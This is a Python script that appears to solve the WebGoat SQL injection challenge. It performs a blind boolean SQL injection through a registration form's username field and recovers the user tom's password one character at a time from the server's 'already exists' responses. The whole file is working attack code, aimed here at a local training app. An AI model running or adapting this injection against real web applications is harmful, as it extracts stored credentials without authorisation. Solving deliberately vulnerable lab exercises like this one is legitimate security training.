import requests
import json
from string import digits, ascii_letters, punctuation

base_url = "http://127.0.0.1:8080"
relative_url = "/WebGoat/SqlInjection/challenge"
cookie = {"JSESSIONID":"989CC4A31FF888131A56EF470F393DB8"}
test_set = digits + ascii_letters + punctuation


user_begin = "tom' AND substring(password, 1, "
user_num = 1
user_end = ") = '"
password_try = ""


email = '1234546@qq.com'
password = '123456'


if __name__ == "__main__":
    url = base_url + relative_url
    for user_num in range (1, 50):
        for i in test_set:
            username_tmp = user_begin + str(user_num) + user_end + password_try + i
            params = {
                'username_reg': username_tmp, 
                'email_reg': email, 
                'password_reg': password, 
                'confirm_password_reg': password
            }
            # json1 = json.dumps(params)
            r = requests.put(url, cookies=cookie, data=params)
            result_json = r.json()
            feedback = str(result_json['feedback']).strip()
            check = ("User " + username_tmp + 
            " already exists please try to register with a different username.")
            if (feedback == check):
                password_try += i
                # print(feedback)
                print(i)
                break
            else:
                print(i, end="")
        else:
            print("")
            print(password_try)
        if (len(password_try) < user_num):
            print(password_try)
            break